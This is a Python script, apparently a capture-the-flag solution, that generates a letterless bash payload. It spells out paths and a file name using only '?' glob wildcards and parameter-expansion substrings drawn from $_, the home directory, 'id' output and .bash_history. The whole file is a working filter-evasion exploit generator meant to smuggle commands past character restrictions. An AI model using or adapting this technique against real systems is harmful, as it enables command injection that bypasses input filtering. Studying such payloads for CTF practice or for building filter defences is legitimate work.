import sys
import re

pre = r'prev=$_;home=~;uno=?;dos=??;tres=???;cuatro=????;cinco=?????;seis=??????;siete=???????;ocho=????????;nueve=?????????;diecioucho=??????????????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});bashjistory=$(${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#diecioucho}:${#uno}}.????????????);script=$(${home:${#seis}:${#uno}}${bashjistory:${#dos}:${#uno}}${bashjistory:${#nueve}:${#uno}}${id:${#diecioucho}:${#uno}}????.??);'
pre = r'prev=$_;home=~;uno=?;dos=??;tres=???;cuatro=????;cinco=?????;seis=??????;siete=???????;ocho=????????;nueve=?????????;diecioucho=??????????????????;id=$(${prev:${#dos}:${#uno}}${home:${#ocho}:${#uno}});bashjistory=$(${home:${#cuatro}:${#uno}}${home:${#seis}:${#uno}}${home:${#uno}:${#dos}}${id:${#diecioucho}:${#uno}}.????????????);script=$(${home:${#seis}:${#uno}}${bashjistory:${#dos}:${#uno}}${bashjistory:${#nueve}:${#uno}}${id:${#diecioucho}:${#uno}}????.??);lksfmnsdlkfj=???????????????????????????????????????????????????????????????????????????;oisfjsdiojel=???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????;lksdfjwpoefn=??????????????????????????;sdlkfnwleknj=?????????????????????????????????????????????????????????????????????????;wefjpoisdvdn=???????????????;pqowfjklcbns=?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????;'

nombre = 'nombre='

post = r'${home:${#seis}:${#uno}}${bashjistory:${#dos}:${#uno}}${bashjistory:${#nueve}:${#uno}}${id:${#diecioucho}:${#uno}}???????/${nombre^^}'

post = r'${home:${#seis}:${#uno}}${bashjistory:${#dos}:${#uno}}${bashjistory:${#nueve}:${#uno}}${id:${#diecioucho}:${#uno}}${script:${#lksfmnsdlkfj}:${#uno}}${script:${#oisfjsdiojel}:${#uno}}${script:${#lksdfjwpoefn}:${#uno}}${script:${#sdlkfnwleknj}:${#uno}}${script:${#siete}:${#uno}}${script:${#wefjpoisdvdn}:${#uno}}${script:${#pqowfjklcbns}:${#uno}}/${nombre^^}'


"""
from string import ascii_lowercase
for char in ascii_lowercase:
	pos = script.find(char)
	if pos == -1:
		continue
	a = '?' * pos
	print(char + " " + str(pos) + ' ' +  a )
"""

variables = [1,2,3,4,5,6,7,8,9]
variables = [1,2,3,4,5,6,7,8,9,75,235,26,73,15,505]

letters = {
	'a': ( r'${script:${#CHANGE}:${#uno}}', 'lksdfjwpoefn', 26   ),
	'b': ( r'${script:${#CHANGE}:${#uno}}', 'siete', 7    ),
	'c': ( r'${script:${#CHANGE}:${#uno}}', 'sdflfksdflfk', 143  ),
	'd': ( r'${script:${#CHANGE}:${#uno}}', 'sdlkfsjdflkj', 36   ),
	'e': ( r'${script:${#CHANGE}:${#uno}}', 'wfklnmsdlkfn', 28   ),
	'f': ( r'${script:${#CHANGE}:${#uno}}', 'lksfmnsdlkfj', 75   ),
	'g': ( r'${script:${#CHANGE}:${#uno}}', 'sdlkfnwleknj', 73   ),
	'h': ( r'${script:${#CHANGE}:${#uno}}', 'flskcfsfdljf', 14   ),
	'i': ( r'${script:${#CHANGE}:${#uno}}', 'ocho', 8    ),
	'j': ( r'${script:${#CHANGE}:${#uno}}', 'wopefkdsovnj', 131  ),
	'k': ( r'${script:${#CHANGE}:${#uno}}', 'spmvckbcpobi', 627  ),
	'l': ( r'${script:${#CHANGE}:${#uno}}', 'oisfjsdiojel', 235  ),
	'm': ( r'${script:${#CHANGE}:${#uno}}', 'lskdjflksdfj', 19   ),
	'n': ( r'${script:${#CHANGE}:${#uno}}', 'nueve', 9    ),
	'o': ( r'${script:${#CHANGE}:${#uno}}', 'wefjpoisdvdn', 15   ),
	'p': ( r'${script:${#CHANGE}:${#uno}}', 'povjmxdflkvn', 11   ),
	'r': ( r'${script:${#CHANGE}:${#uno}}', 'cinco', 5    ),
	's': ( r'${script:${#CHANGE}:${#uno}}', 'cuatro', 4    ),
	't': ( r'${script:${#CHANGE}:${#uno}}', 'seiopfjwnmdf', 13   ),
	'u': ( r'${script:${#CHANGE}:${#uno}}', 'tres', 3    ),
	'v': ( r'${script:${#CHANGE}:${#uno}}', 'slpfdsmnlijo', 1279 ),
	'w': ( r'${script:${#CHANGE}:${#uno}}', 'qpowkfxbmsdv', 214  ),
	'x': ( r'${script:${#CHANGE}:${#uno}}', 'pqowfjklcbns', 505  ),
	'y': ( r'${script:${#CHANGE}:${#uno}}', 'mosdjifsdlfj', 12   )
}

numbers = {
	'0': r'$(())',
	'1': r'${#uno}',
	'2': r'${#dos}',
	'3': r'${#tres}',
	'4': r'${#cuatro}',
	'5': r'${#cinco}',
	'6': r'${#seis}',
	'7': r'${#siete}',
	'8': r'${#ocho}',
	'9': r'${#nueve}'
}

def rename(string):
    matches = re.findall(r'[a-zA-Z]+', string)
    uniques = []
    for match in matches:
        if match not in uniques:
            uniques.append(match)
    for i in range(len(uniques)):
        string = re.sub(uniques[i], '_'*(2+i), string)
    return string

def main():
	global pre, nombre, post
	nombreArchivo = input('Nombre: ')
	if 'Q' in nombreArchivo or 'Z' in nombreArchivo:
		exit('Tiene Q o Z!')

	#nombreArchivo = 'flagbox'

	for char in nombreArchivo:
		if char.isdigit():
			nombre = nombre + numbers[char]
		else:
			payload, varname, cantidad = letters[char.lower()]
			if cantidad not in variables:
				variables.append(cantidad)
				pre = pre + varname + '=' + '?' * cantidad + ';'
			nombre = nombre + payload.replace('CHANGE', varname)
	
	#print(pre)

	#print()

	#print(nombre)
	
	nombre = nombre + ';'
	total = pre + nombre + post
	print(rename(total))

if __name__ == '__main__':
	main()

# GAFXWOFCBSMF97C0A0TIGITOSK8USS7Y
# GAFXWOFCBSMF97C0A0TIGITOS -> es anda, un char mas y rompe...
# echo ${var: -143:1}